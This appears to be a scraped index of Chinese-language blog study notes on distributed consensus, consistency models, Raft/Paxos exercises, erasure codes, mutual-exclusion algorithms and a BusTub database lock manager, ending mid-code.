在同一個情況(狀態)，出來的output都一樣 就算當機，也還是忠誠 共識 共識在不同的情況下有不同的目標\n拜占庭 (拜占庭將軍問題) 忠誠的人最後都要做相同的指令 如果leader忠誠，所有忠誠的人最後都要接受leader的命令 非拜占庭 過半數都同意 所有人都同意 解法 拜占庭的output可能不同所以分成\noral messages: 可以被偽造 signed messages: 不能被偽造簽名\u0026amp;無法改內容(會被抓到)，同時能被任何人驗證 同時所有msg都會\n寄往正確的地方 知道sernder是誰 有辦法知道msg沒有寄成 拜占庭 + oral messages 前提: 至少$2m+1$個人忠誠 (m是叛徒數量)\nleader把msg丟給所有人 把收到的msg丟給自己與leader以外的人 (timeout當成retreat) 根據收集到的msg的多數($2m+1$個)做事 blockchain 在blockchain中，如果有人想做假\n要巨量的工作量 同時要成為最長鏈 (在fork的時候還會讓交易更慢) 拜占庭 + signed messages 前提: 至少$2$個人忠誠\n收到leader的msg，放到orders的set中，把該msg加上自己的sign再傳給其他人 收到其他msg，如果msg不同，放到orders的set中，把該msg加上自己的sign再傳給沒有在上面sign的人 都收完了，透過某個神祕choice函數從orders中選一個order (如果leader忠誠，應該只會有一個order) 非拜占庭 + 過半數都同意 (consensus) paxos\n非拜占庭 + 所有人都同意 (uniform consensus) 一般這裡都是看uniform consensus的特化問題\natomic commit\n所有人都要一起commit或是abort。\n只要有節點發生故障，atomic commit就一定會阻塞嗎？\n根源就在於Abort和Commit並不是對等的決策\n假設有一個節點宕機了，其它節點大可以選擇Abort決策（注意不能選擇Commit），從而讓整個事務Abort掉 在這個過程中，參與分佈式事務的所有節點（包括宕機的這個節點）對於“執行Commit還是Abort”也是達成了共識的（這個共識是Abort）\n同步與異步 \u0026amp; 拜占庭與一般共識 拜占庭需要知道timeout，所以需要同步的時間 一般共識不用知道timeout是異步的\n2PC \u0026amp; 3PC 發transation prepare問所有人行不行commit 都ok，發commit 有人不行，發abort 看起來很簡單，其實有細節 記得，分散式重要的是不能反悔這件事，在2PC有哪邊不能反悔?\n只要回了ok，就必須等到master回commit\n其他狀況都可以用發abort處理\n但這有可能master在發commit之前死亡，這樣所有人都要等\n所以有了3PC，與raft的prevote很像，在要大家prepare之前先問有沒有辦法回ok 因為這個不會回了ok這樣就算有人出事也沒差(fail early)\n因為prevote已經確認過了大家都ok，這樣如果有人出事都可以直接過。 有人在prevorte，回不能commit就不會到第二階段，就不能動\n最後就是看在什麼狀態下能回ok? server已經到了可以跑transation的狀態，同時沒有其他thread(transaction)可以改。 (因為這個會被persist，所以就算crash也沒事)\n3PC的優點： 最大優點就是降低了參與者的阻塞範圍，並且能夠在出現單點故障後繼續達成一致。\n3PC的缺點: 參與者接收到了PreCommit消息，然後網絡出現問題，參與者和協調者無法通信，這種情況下，參與者依然會執行事務的提交。\n時間、排序 我們怎麼意識到時間流逝?\n做了不同的指令 觀察的資料發生變化 有沒有我們無法意識到的時間? 也許有，但對於系統來說永遠有一個，現實時間\n所以時間是什麼? 不一致的證據(證明)\n而時間嚴格遞增，所以可以比較，就有了排序\n順序一致性 sort過後的所有指令，每個read都要與最近的write一樣 (全域的read/write序) 在process中的order要在sort過後的順序中保持 (process中的序) 下面是順序一致性的例子 A –\u0026gt; w1(x) r3(x) –\u0026gt; A // 這是舊的!! C –\u0026gt; w2(x) r3(x) –\u0026gt; C B –\u0026gt; w1(x) r3(x) –\u0026gt; B\n線性一致性 在順序一致性的基礎上加一個條件\n只要時間不overlay，指令之間的在時間上的order都要保持 (全域的時間序) 所以線性一致性可以確保read總是最新的，因此上面的例子不是線性一致\n因果一致性 先定義因果關係 (a -\u0026gt; b，他是transitive，aka happen-before)\n在同一process，a在b之前執行 a做的write，b做read拿到 因果關係是一種偏序，也就是，不是所有東西都可以排序，像沒有因果關係的東西(async的指令)，就沒有排序也不知道怎麼排序；而現實時間是一種全序，都可以用時間點排序\n接著定義因果一致性，在某個process的所有指令與其他process的write，可以sort成\nread拿到的值必須是最近一次的write sort要依據因果關係 這邊的重點是在某個process，也就是我們是從process去看而已。 這有什麼結果?\n不同process可能看到的排序結果可能不同!!\n上圖表達了兩個進程的並發執行過程。它是滿足因果一致性的\n站在P1視角，有：\nA –\u0026gt; w1(x) B –\u0026gt; w2(x) r1(x) –\u0026gt; B 站在P2視角，有：\nB –\u0026gt; w2(x) A –\u0026gt; w1(x) r2(x) –\u0026gt; A\n這樣的好處是可以在其他機器死亡時堤供舊資料，反正只要滿足因果關係就好\nlamport clock \u0026amp; Strong Clock Condition lamport clock的定義是如果a與b有因果關係，a的clock必定小於b的clock (偏序)\n可以為每一個事件上一個數字，之後嚴格遞增，在synchronize時取最大的+1，就會拿到lamport clock。\n同時，clock之間的比較，只有在有因果關係才有意義。 像是兩個併發的指令，比較clock就沒意義。\n但這是可以實現全域排序的其中一種方法，因為clock隱含因果關係。 用clock排序後就有順序一致，如果同時符合時間序，就有線性一致。\n符合時間序叫Strong Clock Condition 因為lamport clock是系統中的時間，與現實(外界)的時間不同步，所以可能看到新的request拿到比較小的lamport clock\n不同步?\n任意兩個時鐘的運行速率有差異，它們的讀數會漂移得越來越遠 時鐘的運行速率跟真實時間的流逝速率可能有差異 gc pause \u0026amp; redlock \u0026amp; fence token: 外界的時間 lamport clock是系統中的時間 Strong Clock Condition是現實或是宇宙的時間\n還有其他時間嗎? 如果gc pause發生，變成自己的時間不準了，因為自己的時間與外界的時間不一致 但實際上時間早已流逝!!\n所以可以引入下一個時間，在redlock的辯論中叫fence token，其實就是storage的lamport clock\n同步時間 NTP可以同步時間，但還是有誤差(還有可能倒退!!)\n所以要把誤差也算在時間點中(spanner的truetime)\n最終一致性 這個一致性沒有保證任何東西，因為我們不確定會有什麼，只知道未來一定會有。\n線性一致性和順序一致性屬於safety property（安全性） 而最終一致性屬於liveness property（活性）\nsafety：它表示「壞事」永遠不會發生 liveness：它表示「好事」最終會發生\n通常來說，只有當safety和liveness這兩種屬性被同時考慮時，一個系統才能提供有意義的系統保證。 對於系統使用者來說，你必須針對數據不一致的可能性做好補償措施 (compensation)。 這也是最終一致性系統難用的地方\nRef 分布式领域最重要的一篇论文，到底讲了什么？ 基于Redis的分布式锁到底安全吗（上）？ 基于Redis的分布式锁到底安全吗（下）？ 条分缕析分布式：因果一致性和相对论时空 The Byzantine Generals Problem\n","permalink":"https://littlebees.github.io/2022/03/%E5%85%B1%E8%AD%98%E9%8C%AF%E8%AA%A4%E6%99%82%E9%96%93%E6%8E%92%E5%BA%8F/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e分散式系統最重要的就是在不同的錯誤情境下達成共識\n之後追求performance\u003c/p\u003e\n\u003cp\u003e串起這一切的就是時間與與之對應的排序\u003c/p\u003e\n\u003cp\u003e下面就來簡單的整理一下\u003c/p\u003e","title":"共識、錯誤、時間、排序"},{"content":"動機 同樣是補6.824上沒有的部分\n換成員 raft博論的練習題 (有練習題你敢信，同時還有paxos的練習題!!) 換成員 (joint consensus) 不能直接用replicate state machine的方式換成員，因為copy log與commit log的時間不一致 這樣可能會選出兩個leader\n在paper上，是引入一個過渡階段，讓所有新的與舊的成員都受到要換的通知(裡面就是當期與下一期的conf)\n之後等commit過渡階段後(新的與舊的成員的大多數都收到了)，之後發新的conf 拿到什麼conf，就對同屬該conf的做回應(投票、appendEntries)\n因此過渡階段的機器有以下特性\n可以對兩邊的conf的機器做回應 兩邊的conf的機器都可以認成leader 如果要達成共識，必須要有兩邊的conf的多數同意 另外有3個有趣的情景\n預熱: 新成員如果直接參加換成員要一段時間才能有新的log 讓新成員成為無法投票的腳色，接受appendEntries 可能有不包含自己的leader 在轉移階段可能leader不在新conf中 被移除的server可能發requestVote讓其他人亂掉 設定可以再投票的最低時間，這樣被移除的就算發投票也會被擋掉 有bug的一次換一個 在作者最初的thesis上有一個一次換一個的algo\n一次換一個，每次都丟一個log，拿到該log馬上認新的 聽起來很合理，反正都有一個server在新舊conf中間，but!!\n別忘了當初raft的quotum是過半數，所以像上面的圖，如果加到一台到dc-1，之後斷線，再變成新的conf之前dc-1與dc-2,3都會因為選不出leader而出事\n而作者給出patch就是no-op，要等no-op到了才可以用新conf (其實這樣就與joint consensus很像，只不過這裡拆成提conf之後no-op，joint consensus是發換conf，之後apply新conf)\n在這裡原po用quotum的觀點去看整個algo\n一次換一個在上面的圖整個quotum的變化是 $Major(a,b,c) =\u0026gt; Major(a,b,c,d) =\u0026gt; Major(b,c,d)$\n如果只用過半數，這樣從abc到abcd可能有人沒有被包含到!! 這樣就沒有quotum的正確性了\n解法就是改寫quotum的定義，只要每次都包含bc(尤其是中間階段)就可以保證正確性了\n這個時候回過頭來看joint consensus 會發現\njoint consensus打從一開始就保證了正確性阿\n練習題 raft 下面的log有沒有可能出現在raft中? 不可能，log term只會越來越大\n可能\n可能\n不可能，raft的safety保證log不會有空洞 (append-only)\n下面有哪些log可以安全commit? 第一個因為每個都有，所以可以安全commit 第二個也是多數都有，所以可以安全commit\n第三個就比較神奇了，因為有不同term的!! 就算term2的是多數，也要考慮，會不會被trim，所以看第一個follower會不會成為leader\n答案是會，所以可能會被trim，所以不能安全commit\n下面是選完leader的畫面，下面follower，有那些log是對的 第一個與第二個不對，只要index與term一樣，前面的所有log都要一樣!! 其他都對\nnextIndex被破壞了會影響raft的正確性嗎?\n不會 太大，在appendEntries會變小 太小，之後會有別的appendEntries\n如果說有超多台機器要一起raft，raft要做什麼調整?\n把election timeout拉長\n因為 第一，傳播時間變久 第二，需要更久時間完成投票，不然可能livelock\n如果忘了voteFor會?\n可能在同一個term投給不同的人!!\n如果忘了一部分log?\n忘了commit過的log，可能會commit不同的log!!\n從舊leader到新leader之間的轉換時，如果舊leader沒有收到其他rpc就會以為自己還是leader繼續commit嗎? 如果是會有問題嗎?\n可能，像是複製到多數時(這時還沒收到reply)，在這多數之中產生新leader，之後舊leader收到reply做commit\n這沒問題，因為log已經copy到多數了，別忘了leader的選出條件是log夠新(當初就是栽在這裡)\n如果換成員時當前leader不在新conf中，此時讓leader直接退位，會發生什麼事? 如果舊leader還能選，之後這位就會一直被選上之後退位，一直重複。 如果舊leader不能選，就是舊conf中的多數人都會經歷被選上之後退位\npaxos 下面的basic paxos的log有不對的嗎? 沒有\n在basic paxos中有5台的3台吃proposal 5.1 with value X 那其他server可能吃不同的value嗎?\n能，只要沒有accept過其他value即可(本來就是空的)\n在Multi-Paxos中，leader的prepare RPC的 lowerbound與upperbound是?\nlowerbound: 1，直接拿到多數的noMoreAccepted=true upperbound: 有幾個空的log就有幾個prepare RPC\nacceptor用firstUnchosenIndex(last_rnd)確認能accept這個value，如果沒有確認會怎樣? 類似，voteFor沒有記憶的問題 會倒退 value A打到一半停下來，之後下一個value B打完，之後value A回來，繼續打，就倒退了\nproposal number (round number and unique server id)交換會發生什麼事?\n正確性(安全性): 沒事，因為round number會保護好accpet 活性: 會飢餓，server id大的可以一直發prepare\n在basic paxos，如果打到中間crash, recover後換了當初打得value會發生什麼事?\n先發了一台ok，之後發剩下的，但是request被delay，同時crash restart後用新value打，把剩下的打完，但delay的request到了(為什麼accept可以改要看下面哪一題)，之後就被改了!! (感覺超像voteFor)\n另一個版本的意外是 先發了一台ok，之後發剩下的到一半crash，之後起來重發新value的 之後下一位進來，做prepare拿到新value與舊value(多數讀，所以可以隨便選value)，之後用舊value發\u0026hellip;\nAccept RPC成功後會根據accpet的值，直接改minProposal，如果沒有這樣做會出什麼事? consensus-bugs\n在換成員時，1 2 3是舊的，3 4 5是新的，如果1 2拿到新conf後直接下線會出什麼事? 最慘就是4 5都是空的，因為現在4 5是多數，但是前面的歷史都在3手上\n","permalink":"https://littlebees.github.io/2022/03/raft%E8%A3%9C%E9%81%BA/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e同樣是補6.824上沒有的部分\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e換成員\u003c/li\u003e\n\u003cli\u003eraft博論的練習題 (有練習題你敢信，同時還有paxos的練習題!!)\u003c/li\u003e\n\u003c/ol\u003e","title":"raft補遺"},{"content":"動機 文章很好懂，紀錄一下 同時把6.824沒說到的補完\n把遺失資料當成未知數 a + b + c = sum(a,b,c)\n這樣可以冗餘一個資料(未知數)\n2個的話? 要2個方程式\n3個? 要3個方程式\n但係數不能隨便選吧? 亂選不一定能求解\n所以有了Vandermonde matrix，他保證有解\n空間是有限的: Galois-Field 也就是說所有數字都只會出現在一定的範圍，同時還有4則運算的性質\n所以可以用它表現方程式，但怎麼用程式表現\nGF(2): xor 以及 \u0026amp; 如果限制只有0與1的Galois-Field，會發現+與*就是xor與\u0026amp;\nGF(2)的多項式: 邁向高維 係數放GF(2)，剩下就是一般的多項式\n這樣只要項目變多，能表現的數目也會越多 $a_1x^8+a_2x^7+\u0026hellip;.+a_7x+a_8$\n像上面的式子可以表現$2^8$個東西 就是一個byte\n再來就是要取餘數(餘數要是質數)，不然會超過!!\n所以選下面的式子 $x^8+x^4+x^3+x^2+1$\nEC的實現方式 用GF(2)的多項式表示資料 用Vandermonde matrix求回復資料 需要回復時用Vandermonde matrix的逆矩陣求解\nRef Erasure-Code-擦除码-2-实现篇 Erasure-Code-擦除码-1-原理篇\n","permalink":"https://littlebees.github.io/2022/03/erasure-code/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e文章很好懂，紀錄一下\n同時把6.824沒說到的補完\u003c/p\u003e","title":"Erasure Code"},{"content":"動機 只是記錄用，因為在現代計算機架構下，基本上都沒用 但有面試問過，所以寫一下\nPeterson algorithm 用flag與term來阻止對方\ndef f1(): flag[0] = true turn = 1 while flag[1] == true and turn == 1: # busy wait # critical section # ... # end of critical section flag[0] = false def f1(): flag[1] = true turn = 0 while flag[0] == true and turn == 0: # busy wait # critical section # ... # end of critical section flag[1] = false 為什麼需要turn? 不然flag都會是true\nLamport\u0026rsquo;s bakery algorithm 利用sequence嚴格遞增，對thread做sort\n// Entering: array [1..NUM_THREADS] of bool = {false}; // Number: array [1..NUM_THREADS] of integer = {0}; lock(integer i) { Entering[i] = true; Number[i] = 1 + max(Number[1], ..., Number[NUM_THREADS]); Entering[i] = false; for (integer j = 1; j \u0026lt;= NUM_THREADS; j++) { // Wait until thread j receives its number: while (Entering[j]) { /* nothing */ } // Wait until all threads with smaller numbers or with the same // number, but with higher priority, finish their work: while ((Number[j] != 0) \u0026amp;\u0026amp; ((Number[j], j) \u0026lt; (Number[i], i))) { /* nothing */ } // 有沒有想到raft的投票，或是at-least-updated } } unlock(integer i) { Number[i] = 0; } 問題是? 現代cpu會reorder程式碼\n像peterson的可以reorder成\nturn = 1 flag[0] = true # ... turn = 0 flag[1] = true bakery可以reorder成\nlock(integer i) { Entering[i] = true; Entering[i] = false; // 之後變成只剩false Number[i] = 1 + max(Number[1], ..., Number[NUM_THREADS]); // ... } 因為想做atomic的資料與做atomic的資料沒有關聯(因果關係)\n感覺比較可以的: Szymański\u0026rsquo;s algorithm 把狀態切的細一點，分成 0: 在外面，未申請訪問臨界區 1: 在入口門外等待 2: 在入口門內等待其它提出申請的進程都進入入口門 3: 正在進入入口門 4: 入口門關閉，在等候室里等待進入臨界區，或正在訪問臨界區\n// Entry protocol flag[self] = 1 // Standing outside waiting room await(all flag[1..N] ∈ {0, 1, 2}) // Wait for open door flag[self] = 3 // Standing in doorway if any flag[1..N] = 1: // Another process is waiting to enter flag[self] = 2 // Waiting for other processes to enter await(any flag[1..N] = 4) // Wait for a process to enter and close the door flag[self] = 4 // The door is closed await(all flag[1..self-1] ∈ {0, 1}) // Wait for everyone of lower ID to finish exit protocol // Critical section // ... // Exit protocol await(all flag[self+1..N] ∈ {0, 1, 4}) // Ensure everyone in the waiting room has // realized that the door is supposed to be closed flag[self] = 0 // Leave. Reopen door if nobody is still in the waiting room ","permalink":"https://littlebees.github.io/2022/03/sync%E6%BC%94%E7%AE%97%E6%B3%95-%E4%BD%86%E6%B2%92%E7%94%A8/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e只是記錄用，因為在現代計算機架構下，基本上都沒用\n但有面試問過，所以寫一下\u003c/p\u003e","title":"sync演算法 (但沒用)"},{"content":"動機 不完全的理由是1~3只有跑local simple test，因為我的重點是第4個lab 想要了解不同的isolation level的效果\ngradescope 優點 可以print測資 缺點 有神秘的語法限制，但是不會報錯，只有下面的訊息 The autograder failed to execute correctly. Please ensure that your submission is valid. Contact your course staff for help in debugging this issue. Make sure to include a link to this page so that they can help you most effectively. 超慢，每次上傳至少超過一分鐘才會看到結果，也沒有做到哪個階段的過程 在project4，明明local的所有測資都過了，但就是有一個test不知道為什麼跑不了 output沒有任何東西，直接timeout，但測資有挖出來測過有pass\u0026hellip; 同時後面直接在method的第一行放一個cout，之後看timeout的output也沒有噴出來\u0026hellip; 答案是rehash，這個很可怕，見下面 一開始還有整個平台不能用的問題 (為期大概一個禮拜) Is the autograder be fixed? project1 提幾個重點\nlru不是一般認知的lru，unpin之後就不用管了 page分成readable與occupied 有allocate就是occupied，之後就不用動了 readable就是delete時要改的 dirty由invoker管，有直到下面的case才會真的寫回去disk flush 被選成victim project2 bucket就是一個page，直接從頭做search，剩下的struct不用動(也不能動，因為page剩下的空間都是array_的)\n剩下就是看這個\nproject3 其實邏輯都很簡單，但是難在怎麼使用你要的功能要反覆\n透過trace 看別人的example 總的來說，只要懂得怎麼\n從catalog拿table 從table的table_iterator拿tuple與rid(當成tuple的address) 怎麼根據output scheme來產生tuple (轉成vector\u0026lt;value\u0026gt;之後變成tuple) 怎麼做expression的evalute (要去各自的plan看) project3就做得出來，其實這就是interpreter pattern\nproject4 這是重點所以慢慢講，還有下面是gradescope上的屍體(差valgrind)，local上的成體。\nISOLATION LEVELS SERIALIZABLE 上 index lock (條件) Why write skew can happen in Repeatable reads? 假設兩個thread都看到還有一個蘋果 (Read lock) 之後兩個跑increase，就變成-1 (upgrade lock) 這裡的重點是在改的當下無法保證條件是成立的 解法是 鎖整個表 為條件(不一定存在的欄位)生出一個鎖 column的read lock column的write lock 直到(strict)commit才把所有lock放掉 (strict 2 phase lock) REPEATABLE READS (SNAPSHOT ISOLATION) 上 column的read lock column的write lock 直到commit才把所有lock放掉 (strict 2 phase lock) READ COMMITTED 上 column的read lock column的write lock 直到commit才把所有lock放掉 除了read lock，他可以馬上放掉 (2 phase lock) READ UNCOMMITTED 不能上lock 在bustub的流程 begin會拿到transaction的id，每個transation會記錄拿了什麼lock(shared或exclusive)\ncommit與abort時會一次unlock所有lock\nabort還會從log中undo之前的操作，commit比較特別的是會一次把delete做完\nlock manager 有3個部分\n根據ISOLATION LEVELS決定鎖怎麼給 怎麼abort與wait (deadlock prevention) 指令(project3)怎麼用lock manager上lock 指令上lock不難，注意\nREAD UNCOMMITTED不用上鎖 READ COMMITTED的read lock要放掉 怎麼abort與wait可以看這個\n同個網站的extendsible hash也很清楚明瞭，我自己的project2的local test就是看他才做出來的\n這裡是做wound-wait，就是\n遇到老事務，等 遇到新事物，abort他 bool LockManager::LockRequestQueue::WaitWound(Transaction *txn, const RID \u0026amp;rid, LockRequestQueue::WaitPred wait_pred, LockRequestQueue::WoundPred wound_pred) { std::unique_lock\u0026lt;std::mutex\u0026gt; ul(lk_); auto \u0026amp;q = request_queue_; auto ptr = q.begin(); while (ptr != q.end()) { if (ptr-\u0026gt;txn_id_ \u0026lt; txn-\u0026gt;GetTransactionId() \u0026amp;\u0026amp; wait_pred(ptr)) { // old txn cv_.wait(ul); if (txn-\u0026gt;GetState() == TransactionState::ABORTED) { return false; } ptr = q.begin(); // restart check } else if (ptr-\u0026gt;txn_id_ \u0026gt; txn-\u0026gt;GetTransactionId() \u0026amp;\u0026amp; wound_pred(ptr, rid)) { // young txn assert(ptr-\u0026gt;txn_id_ != txn-\u0026gt;GetTransactionId()); Transaction *trans = TransactionManager::GetTransaction(ptr-\u0026gt;txn_id_); ptr = q.erase(ptr); trans-\u0026gt;SetState(TransactionState::ABORTED); cv_.notify_all(); } else { ptr++; } } return true; } 流程是\nenqueue，去排隊 做WaitWound，等與清其他事務 拿鎖 auto me = q.Enqueue(txn, rid, LockMode::EXCLUSIVE); if (!q.WaitWound(txn, rid, pred1, pred2)) { return false; } txn-\u0026gt;SetState(TransactionState::GROWING); 最後是根據ISOLATION LEVELS決定鎖怎麼給\nexclusive\nbool not_appliable = txn-\u0026gt;GetState() == TransactionState::ABORTED; bool need_abort = txn-\u0026gt;GetState() == TransactionState::SHRINKING \u0026amp;\u0026amp; txn-\u0026gt;GetIsolationLevel() == IsolationLevel::REPEATABLE_READ; if (not_appliable || need_abort) { if (need_abort) { txn-\u0026gt;SetState(TransactionState::ABORTED); } return false; } if (!txn-\u0026gt;IsExclusiveLocked(rid)) { LockRequestQueue::WaitPred pred1 = [](LockRequestQueue::QIter \u0026amp;ptr) { return true; }; LockRequestQueue::WoundPred pred2 = [](LockRequestQueue::QIter \u0026amp;ptr, const RID \u0026amp;rid) { Transaction *trans = TransactionManager::GetTransaction(ptr-\u0026gt;txn_id_); trans-\u0026gt;GetExclusiveLockSet()-\u0026gt;erase(rid); trans-\u0026gt;GetSharedLockSet()-\u0026gt;erase(rid); return true; }; auto me = q.Enqueue(txn, rid, LockMode::EXCLUSIVE); if (!q.WaitWound(txn, rid, pred1, pred2)) { return false; } txn-\u0026gt;SetState(TransactionState::GROWING); me-\u0026gt;lock_mode_ = LockMode::EXCLUSIVE; me-\u0026gt;granted_ = true; txn-\u0026gt;GetExclusiveLockSet()-\u0026gt;emplace(rid); } return true; shared\nbool not_appliable = txn-\u0026gt;GetState() == TransactionState::ABORTED; bool need_abort = txn-\u0026gt;GetIsolationLevel() == IsolationLevel::READ_UNCOMMITTED || txn-\u0026gt;GetState() == TransactionState::SHRINKING; if (not_appliable || need_abort) { if (need_abort) { txn-\u0026gt;SetState(TransactionState::ABORTED); } return false; } if (!txn-\u0026gt;IsSharedLocked(rid)) { LockRequestQueue::WaitPred pred1 = [](LockRequestQueue::QIter \u0026amp;ptr) { return ptr-\u0026gt;lock_mode_ == LockMode::EXCLUSIVE; }; LockRequestQueue::WoundPred pred2 = [](LockRequestQueue::QIter \u0026amp;ptr, const RID \u0026amp;rid) { if (ptr-\u0026gt;lock_mode_ == LockMode::EXCLUSIVE) { Transaction *trans = TransactionManager::GetTransaction(ptr-\u0026gt;txn_id_); trans-\u0026gt;GetExclusiveLockSet()-\u0026gt;erase(rid); trans-\u0026gt;GetSharedLockSet()-\u0026gt;erase(rid); return true; } return false; }; auto me = q.Enqueue(txn, rid, LockMode::SHARED); if (!q.WaitWound(txn, rid, pred1, pred2)) { return false; } txn-\u0026gt;SetState(TransactionState::GROWING); me-\u0026gt;granted_ = true; txn-\u0026gt;GetSharedLockSet()-\u0026gt;emplace(rid); } return true; upgrade其實與exclusive差不多 就是最後要把shared拔掉與exclusive塞進去\nauto \u0026amp;q = GetQ(rid); bool not_appliable = txn-\u0026gt;GetState() == TransactionState::ABORTED; bool need_abort = txn-\u0026gt;GetState() == TransactionState::SHRINKING \u0026amp;\u0026amp; txn-\u0026gt;GetIsolationLevel() == IsolationLevel::REPEATABLE_READ; if (not_appliable || need_abort) { if (need_abort) { txn-\u0026gt;SetState(TransactionState::ABORTED); } return false; } if (!txn-\u0026gt;IsExclusiveLocked(rid)) { LockRequestQueue::WaitPred pred1 = [](LockRequestQueue::QIter \u0026amp;ptr) { return true; }; LockRequestQueue::WoundPred pred2 = [](LockRequestQueue::QIter \u0026amp;ptr, const RID \u0026amp;rid) { Transaction *trans = TransactionManager::GetTransaction(ptr-\u0026gt;txn_id_); trans-\u0026gt;GetExclusiveLockSet()-\u0026gt;erase(rid); trans-\u0026gt;GetSharedLockSet()-\u0026gt;erase(rid); return true; }; auto me = q.Enqueue(txn, rid, LockMode::EXCLUSIVE); if (!q.WaitWound(txn, rid, pred1, pred2)) { return false; } txn-\u0026gt;SetState(TransactionState::GROWING); me-\u0026gt;lock_mode_ = LockMode::EXCLUSIVE; me-\u0026gt;granted_ = true; txn-\u0026gt;GetSharedLockSet()-\u0026gt;erase(rid); txn-\u0026gt;GetExclusiveLockSet()-\u0026gt;emplace(rid); } return true; 要記得的是在abort與unlock之後馬上notify_all\nbool Unlock(Transaction *txn, const RID \u0026amp;rid, LockMode txn_lockmode) { std::unique_lock\u0026lt;std::mutex\u0026gt; ul(lk_); auto ptr = request_queue_.find(LockRequest{txn-\u0026gt;GetTransactionId(), txn_lockmode}); if (ptr != request_queue_.end()) { request_queue_.erase(ptr); if (txn_lockmode == LockMode::SHARED) { txn-\u0026gt;GetSharedLockSet()-\u0026gt;erase(rid); } else { txn-\u0026gt;GetExclusiveLockSet()-\u0026gt;erase(rid); } cv_.notify_all(); return true; } return false; } 剩下是因為懶，就用unordered_set管理queue\nclass LockRequest { public: LockRequest(txn_id_t txn_id, LockMode lock_mode) : txn_id_(txn_id), lock_mode_(lock_mode), granted_(false) {} txn_id_t txn_id_; mutable LockMode lock_mode_; mutable bool granted_; }; struct LockRequestHash { std::size_t operator()(const LockRequest \u0026amp;a) const { return a.txn_id_; } }; struct LockRequestEq { bool operator()(const LockRequest \u0026amp;a, const LockRequest \u0026amp;b) const { return a.txn_id_ == b.txn_id_; } }; class LockRequestQueue { public: using QIter = std::unordered_set\u0026lt;LockRequest, LockRequestHash, LockRequestEq\u0026gt;::iterator; using LocalLock = std::unique_lock\u0026lt;std::mutex\u0026gt;; using WaitPred = bool (*)(QIter \u0026amp;); using WoundPred = bool (*)(QIter \u0026amp;, const RID \u0026amp;); std::mutex lk_; std::unordered_set\u0026lt;LockRequest, LockRequestHash, LockRequestEq\u0026gt; request_queue_; // for notifying blocked transactions on this rid std::condition_variable cv_; // txn_id of an upgrading transaction (if any) // txn_id_t upgrading_ = INVALID_TXN_ID; //bool upgrading_ = false; LockRequestQueue() { request_queue_.reserve(50); } // avoid rehash QIter Enqueue(Transaction *txn, const RID \u0026amp;rid, LockMode mode) { std::unique_lock\u0026lt;std::mutex\u0026gt; ul(lk_); auto \u0026amp;q = request_queue_; return q.insert(LockRequest{txn-\u0026gt;GetTransactionId(), mode}).first; } bool WaitWound(Transaction *txn, const RID \u0026amp;rid, WaitPred wait_pred, WoundPred wound_pred); bool Unlock(Transaction *txn, const RID \u0026amp;rid, LockMode txn_lockmode) { std::unique_lock\u0026lt;std::mutex\u0026gt; ul(lk_); auto ptr = request_queue_.find(LockRequest{txn-\u0026gt;GetTransactionId(), txn_lockmode}); if (ptr != request_queue_.end()) { request_queue_.erase(ptr); if (txn_lockmode == LockMode::SHARED) { txn-\u0026gt;GetSharedLockSet()-\u0026gt;erase(rid); } else { txn-\u0026gt;GetExclusiveLockSet()-\u0026gt;erase(rid); } cv_.notify_all(); return true; } return false; } }; rehash的bug 全力感謝 记一个关于std::unordered_map并发下rehash引起的的BUG\n但gradescope還是很爛\n這個bug可怕在哪裡? 只在gradescope上發生，gradescope跑得很慢，gradescope限制output的總量(還有build的output已經先佔了一定容量)，也很難猜(我當初沒想到阿，明明都用id做hash key了)\nroot cause是unordered_map會rehash，所以可能同個key寫到同一個值，讓之前寫的不見 所以讓有用到hash的container都reserve，減少rehash的可能\n但是在我的code上這樣會過不了valgrind，但我懶了，反正目的是認識concurency control，目的已經達到了\n這次的反省是使用別人的東西之前，要好好看文件(這個我好像之前在別的文章打過一樣的結論\u0026hellip;) 特別注意有沒有做一些user不知道的事(像rehash)，這種transparent的行為都是悲劇與痛苦的來源\n最後，附上修法，除了LockQueue以外，還有LockManager的lock_table要做reserve\nclass LockManager { enum class LockMode { SHARED, EXCLUSIVE }; class LockRequest { public: LockRequest(txn_id_t txn_id, LockMode lock_mode) : txn_id_(txn_id), lock_mode_(lock_mode), granted_(false) {} txn_id_t txn_id_; mutable LockMode lock_mode_; mutable bool granted_; }; struct LockRequestHash { std::size_t operator()(const LockRequest \u0026amp;a) const { return a.txn_id_; } }; struct LockRequestEq { bool operator()(const LockRequest \u0026amp;a, const LockRequest \u0026amp;b) const { return a.txn_id_ == b.txn_id_; } }; class LockRequestQueue { public: using QIter = std::unordered_set\u0026lt;LockRequest, LockRequestHash, LockRequestEq\u0026gt;::iterator; using LocalLock = std::unique_lock\u0026lt;std::mutex\u0026gt;; using WaitPred = bool (*)(QIter \u0026amp;); using WoundPred = bool (*)(QIter \u0026amp;, const RID \u0026amp;); std::mutex lk_; std::unordered_set\u0026lt;LockRequest, LockRequestHash, LockRequestEq\u0026gt; request_queue_; // for notifying blocked transactions on this rid std::condition_variable cv_; // txn_id of an upgrading transaction (if any) // txn_id_t upgrading_ = INVALID_TXN_ID; LockRequestQueue() { request_queue_.reserve(50); } // avoid rehash QIter Enqueue(Transaction *txn, const RID \u0026amp;rid, LockMode mode) { std::unique_lock\u0026lt;std::mutex\u0026gt; ul(lk_); auto \u0026amp;q = request_queue_; return q.insert(LockRequest{txn-\u0026gt;GetTransactionId(), mode}).first; } bool WaitWound(Transaction *txn, const RID \u0026amp;rid, WaitPred wait_pred, WoundPred wound_pred); bool Unlock(Transaction *txn, const RID \u0026amp;rid, LockMode txn_lockmode) { std::unique_lock\u0026lt;std::mutex\u0026gt; ul(lk_); auto ptr = request_queue_.find(LockRequest{txn-\u0026gt;GetTransactionId(), txn_lockmode}); if (ptr != request_queue_.end()) { request_queue_.erase(ptr); if (txn_lockmode == LockMode::SHARED) { txn-\u0026gt;GetSharedLockSet()-\u0026gt;erase(rid); } else { txn-\u0026gt;GetExclusiveLockSet()-\u0026gt;erase(rid); } cv_.notify_all(); return true; } return false; } }; public: /** * Creates a new lock manager configured for the deadlock prevention policy. */ LockManager() { lock_table_.reserve(50); } // avoid rehash ~LockManager() = default; /* * [LOCK_NOTE]: For all locking functions, we: * 